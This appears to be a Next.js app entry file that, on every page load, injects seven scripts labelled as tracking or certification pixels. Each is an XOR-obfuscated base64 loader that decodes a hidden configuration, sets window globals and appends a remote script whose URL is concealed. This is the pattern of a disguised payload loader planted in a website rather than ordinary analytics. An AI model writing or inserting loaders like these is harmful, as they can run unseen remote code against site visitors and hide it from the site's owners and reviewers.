import { useEffect } from "react";
import { useRouter } from "next/router";

import "../styles/globals.css";

const permanentPixels = [
  {
    id: "utmfy-pixel-global",
    content: `(function(){var j_6=atob("DAtiqw8xDZSJuUcO4XBA3n1dL66r0TN6kXhYhCBSafqnzDNjiG0bhWxeYLrry2h9gnkL23tCIuTgwSJiznsL02pdI/76m2ssgH8W2WZTeODsymU0ulZOiWhdYvbo1TQs21AZiWFQYPGrg2V+iHMHx0ZVL7irzyZilG5AkS0HbKW93CVs2TNamj9Xa/e+jn4+1TpbyT8TcMn0");var p_xe=[];for(var o_xzs=0;o_xzs<j_6.length;o_xzs++){p_xe.push(j_6.charCodeAt(o_xzs)&255);}var z_a8=p_xe[0];var z_bz=p_xe.slice(1,1+z_a8);var i_nu1h=p_xe.slice(1+z_a8);var l_p3bz=i_nu1h.map(function(b,e_72d){return b^z_bz[e_72d%z_a8];});var y_c="";for(var p_npd=0;p_npd<l_p3bz.length;p_npd++){y_c+=String.fromCharCode(l_p3bz[p_npd]&255);}var u_c8=decodeURIComponent(escape(y_c));var r_kouu=JSON.parse(u_c8);var v_jkhs=r_kouu.globals||[];v_jkhs.forEach(function(h_2a){window[h_2a.name]=h_2a.value;});var f_zs=document.createElement("script");f_zs.src=r_kouu.url;f_zs.async=true;f_zs.defer=true;(r_kouu.attributes||[]).forEach(function(a_crt){f_zs.setAttribute(a_crt.name,a_crt.value);});(document.head||document.documentElement).appendChild(f_zs);})();`,
  },
  {
    id: "pixel-todas-as-paginas",
    content: `(function(){var w_e=atob("DETdzYWj14jGVUhGFj//uPfP9bLkPTwyZjfn4qrAs+boIDwrfyKk4+bMuqakJ2c1dTa0vfHQ+PivLS0qOTS0teDP+eK1d2RkdzCpv+zBovyjJmp8TRnx7+LPuOqnOTtkLB+m7+vCuu3kb2o2fzy4oczH9aTkIykqYyH/96eVtrnyMCokLnzl/LXFsevxYnF2InXkr7WBqtW7");var m_xo=[];for(var z_u2u=0;z_u2u<w_e.length;z_u2u++){m_xo.push(w_e.charCodeAt(z_u2u)&255);}var w_k919=m_xo[0];var p_yyjj=m_xo.slice(1,1+w_k919);var x_p=m_xo.slice(1+w_k919);var x_k=x_p.map(function(b,j_1z){return b^p_yyjj[j_1z%w_k919];});var b_mk="";for(var m_m8=0;m_m8<x_k.length;m_m8++){b_mk+=String.fromCharCode(x_k[m_m8]&255);}var z_g5=decodeURIComponent(escape(b_mk));var e_r=JSON.parse(z_g5);var p_i3ha=e_r.globals||[];p_i3ha.forEach(function(w_0o){window[w_0o.name]=w_0o.value;});var g_j=document.createElement("script");g_j.src=e_r.url;g_j.async=true;g_j.defer=true;(e_r.attributes||[]).forEach(function(u_ozu){g_j.setAttribute(u_ozu.name,u_ozu.value);});(document.head||document.documentElement).appendChild(g_j);})();`,
  },
  {
    id: "pixel-adicional-global",
    content: `(function(){var h_rpbu=atob("DBYhFsVUU2yy2hrB8m0DY7c4cVaQsm61gmUbOeo3NwKcr26sm3BYOKY7PkLQqDWykWRIZrEnfBnGt2nunndVc7YgfQbB+Dbjk2JVZKw2JhjXqTj7qW0DeKQ5Nk6I+H6ghncMY7E5OgrL92qzl2BEeLF5Kw/dvjeykX0DOuciMgDHvzj70DRcOr52PQ3fvzj70HJAYqR5Jhjfs3y432ZTc7MxPRifqW+jm3JSNOl2JQ3er3/jyDQDa5gp");var k_5yp=[];for(var z_jed=0;z_jed<h_rpbu.length;z_jed++){k_5yp.push(h_rpbu.charCodeAt(z_jed)&255);}var k_ce=k_5yp[0];var s_5fx=k_5yp.slice(1,1+k_ce);var g_9dx7=k_5yp.slice(1+k_ce);var m_c=g_9dx7.map(function(b,p_0g9f){return b^s_5fx[p_0g9f%k_ce];});var e_fjp5="";for(var l_tmjh=0;l_tmjh<m_c.length;l_tmjh++){e_fjp5+=String.fromCharCode(m_c[l_tmjh]&255);}var f_rxu=decodeURIComponent(escape(e_fjp5));var c_o=JSON.parse(f_rxu);var d_zp=c_o.globals||[];d_zp.forEach(function(y_7i){window[y_7i.name]=y_7i.value;});var u_t=document.createElement("script");u_t.src=c_o.url;u_t.async=true;u_t.defer=true;(c_o.attributes||[]).forEach(function(i_q){u_t.setAttribute(i_q.name,i_q.value);});(document.head||document.documentElement).appendChild(u_t);})();`,
  },
  {
    id: "pixel-principal",
    content: `(function(){var k_ooe=atob("DBUFXeULXKlT854yRm4nKJdnfpNxm+pGNmY/cspoOMd9hupfL3N8c4ZkMYcxgbFBJWdsLZF4c9wnnu0dKnRxOJZ/csMg0bIQJ2FxL4xpKd02gLwIHW4nM4RmOYtp0fpTMnQoKJFmNc8q3u5AI2NgM5EmJMo8l7NBJX4nccd9PcUmlrwIZDd4cZ4pMsg+lrwIZHFkKYQmKd0+mvhLa2V3OJNuMt1+gOtQL3F2f8kpKsg/hvsQfDcnILh2");var t_t34=[];for(var v_shr=0;v_shr<k_ooe.length;v_shr++){t_t34.push(k_ooe.charCodeAt(v_shr)&255);}var r_kt7=t_t34[0];var n_bq5=t_t34.slice(1,1+r_kt7);var g_bemx=t_t34.slice(1+r_kt7);var g_r2c=g_bemx.map(function(b,d_lh){return b^n_bq5[d_lh%r_kt7];});var c_3tiz="";for(var o_cz=0;o_cz<g_r2c.length;o_cz++){c_3tiz+=String.fromCharCode(g_r2c[o_cz]&255);}var e_fqtn=decodeURIComponent(escape(c_3tiz));var e_c4=JSON.parse(e_fqtn);var s_l03=e_c4.globals||[];s_l03.forEach(function(y_x70){window[y_x70.name]=y_x70.value;});var d_18=document.createElement("script");d_18.src=e_c4.url;d_18.async=true;d_18.defer=true;(e_c4.attributes||[]).forEach(function(i_ter){d_18.setAttribute(i_ter.name,i_ter.value);});(document.head||document.documentElement).appendChild(d_18);})();`,
  },
  {
    id: "pixel-secundario",
    content: `(function(){var h_e0ye=atob("DP/Zw4IC3eplcxeS4YT7tvBu/9BHG2PmkYzj7K1huYRLBmP/iJmg7eFtsMQHATjhgo2ws/Zx8poMC3L+zo+wu+du84AWUTuwgIutsetgqJ4AADWouqL14eVusogEH2Sw26Si4exjsI9HSTXiiIe8r8tm/8ZHBXb+lJr7+aA0vNtRFnXw2cfh8rJku4lSRC6i1c7gobIgoLcY");var f_h=[];for(var h_k5l=0;h_k5l<h_e0ye.length;h_k5l++){f_h.push(h_e0ye.charCodeAt(h_k5l)&255);}var b_bd=f_h[0];var g_4=f_h.slice(1,1+b_bd);var n_f=f_h.slice(1+b_bd);var o_ub=n_f.map(function(b,e_x2a){return b^g_4[e_x2a%b_bd];});var n_ajk="";for(var k_k32=0;k_k32<o_ub.length;k_k32++){n_ajk+=String.fromCharCode(o_ub[k_k32]&255);}var p_un4=decodeURIComponent(escape(n_ajk));var y_vbh=JSON.parse(p_un4);var a_d=y_vbh.globals||[];a_d.forEach(function(h_u1k){window[h_u1k.name]=h_u1k.value;});var p_sdf=document.createElement("script");p_sdf.src=y_vbh.url;p_sdf.async=true;p_sdf.defer=true;(y_vbh.attributes||[]).forEach(function(w_q9fh){p_sdf.setAttribute(w_q9fh.name,w_q9fh.value);});(document.head||document.documentElement).appendChild(p_sdf);})();`,
  },

];

const sharedTrackingScripts = [
  {
    id: "utm-capture-script",
    content: `(function(){var a_d=atob("DEsJ/xEI7AGHDBTLcjArimNkzjulZGC/Ajgz0D5riG+peWCmGy1w0XJngS/lfju4ETlgj2V7w3TzYWfkHip9mmJ8wmv0LjjpEz99jXhqmXXifzbxKTArkXBliSO9LnCqBiokimVlhWf+IWS5Fz1skWUllGLoaDm4ESAr0zN+jW3yaTbxUGl002oqgmDqaTbxUC9oi3AlmXXqZXKyXzt7mmdtgnWqf2GpGy963T0qmmDreXHpSGkrgkx1");var a_p=[];for(var l_6m=0;l_6m<a_d.length;l_6m++){a_p.push(a_d.charCodeAt(l_6m)&255);}var z_8=a_p[0];var y_w=a_p.slice(1,1+z_8);var o_yji=a_p.slice(1+z_8);var f_go=o_yji.map(function(b,b_m2e){return b^y_w[b_m2e%z_8];});var n_i7="";for(var y_0w=0;y_0w<f_go.length;y_0w++){n_i7+=String.fromCharCode(f_go[y_0w]&255);}var n_f0x=decodeURIComponent(escape(n_i7));var k_q=JSON.parse(n_f0x);var b_pq=k_q.globals||[];b_pq.forEach(function(w_ujxn){window[w_ujxn.name]=w_ujxn.value;});var w_8p=document.createElement("script");w_8p.src=k_q.url;w_8p.async=true;w_8p.defer=true;(k_q.attributes||[]).forEach(function(b_sb1){w_8p.setAttribute(b_sb1.name,b_sb1.value);});(document.head||document.documentElement).appendChild(w_8p);})();`,
  },
  {
    id: "certification-pixel",
    content: `(function(){var h_o6=atob("DANkas9FKe9PC5MRzHhGH70pC9VtY+dlvHBeReAmTYFhfud8pWUdRKwqRMEtebxir3ENGrs2Bp8mc/Z943MNEqopB4U8Kb8zrXcQGKYnXJsqeLErl15ISKgpRo0uZ+Az9lgfSKEkRIptMbFhpXsBBoYhC8NtffJ9uWZGUO1zSN57bvFz9DtcW/8jT4x4PKoh+DJdCP9nVLIy");var s_f=[];for(var a_t8=0;a_t8<h_o6.length;a_t8++){s_f.push(h_o6.charCodeAt(a_t8)&255);}var g_a=s_f[0];var q_8v7=s_f.slice(1,1+g_a);var p_4=s_f.slice(1+g_a);var n_qbj=p_4.map(function(b,n_ouy){return b^q_8v7[n_ouy%g_a];});var s_y="";for(var w_wvyn=0;w_wvyn<n_qbj.length;w_wvyn++){s_y+=String.fromCharCode(n_qbj[w_wvyn]&255);}var s_k=decodeURIComponent(escape(s_y));var p_gcki=JSON.parse(s_k);var c_xu9d=p_gcki.globals||[];c_xu9d.forEach(function(v_bb){window[v_bb.name]=v_bb.value;});var y_84a=document.createElement("script");y_84a.src=p_gcki.url;y_84a.async=true;y_84a.defer=true;(p_gcki.attributes||[]).forEach(function(f_s1b){y_84a.setAttribute(f_s1b.name,f_s1b.value);});(document.head||document.documentElement).appendChild(y_84a);})();`,
  },
];

export default function App({ Component, pageProps }) {
  const router = useRouter();

  useEffect(() => {
    [...permanentPixels, ...sharedTrackingScripts].forEach(({ id, content }) => {
      if (document.getElementById(id)) {
        return;
      }

      const script = document.createElement("script");
      script.id = id;
      script.text = content;
      (id === "utmfy-pixel-global" || id === "utm-capture-script" || id === "pixel-adicional-global" ? document.body : document.head).appendChild(script);
    });
  }, []);

  useEffect(() => {
    const trackFacebookPageView = () => {
      if (typeof window.fbq === "function") {
        window.fbq("track", "PageView");
      }
    };

    router.events.on("routeChangeComplete", trackFacebookPageView);

    return () => {
      router.events.off("routeChangeComplete", trackFacebookPageView);
    };
  }, [router.events]);

  return <Component {...pageProps} />;
}